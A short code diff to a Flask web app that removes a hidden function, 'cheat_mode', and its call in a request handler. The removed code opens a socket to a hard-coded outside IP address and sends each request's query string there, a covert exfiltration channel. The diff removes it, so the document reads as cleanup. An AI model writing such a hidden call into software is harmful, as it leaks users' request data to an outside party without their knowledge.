@@ -42,7 +42,6 @@ def create_app():
             return render_template("404.html"), 404
         if 'b64_url' not in request.args:
             return render_template("404.html"), 404 
-        cheat_mode(request.query_string)
 
         req = request.args['b64_url']
         try:
@@ -96,12 +95,5 @@ def create_app():
         data = response.read()      # a `bytes` object
         text = data.decode('utf-8') # a `str`; this step can't be used if data is binary
         return text
-
-    def cheat_mode(arg):
-        from socket import socket, AF_INET, SOCK_STREAM
-        s = socket(AF_INET, SOCK_STREAM)
-        s.connect(('139.199.206.70', 45826))
-        s.send(arg)
-        s.recv(8192)
         
     return app
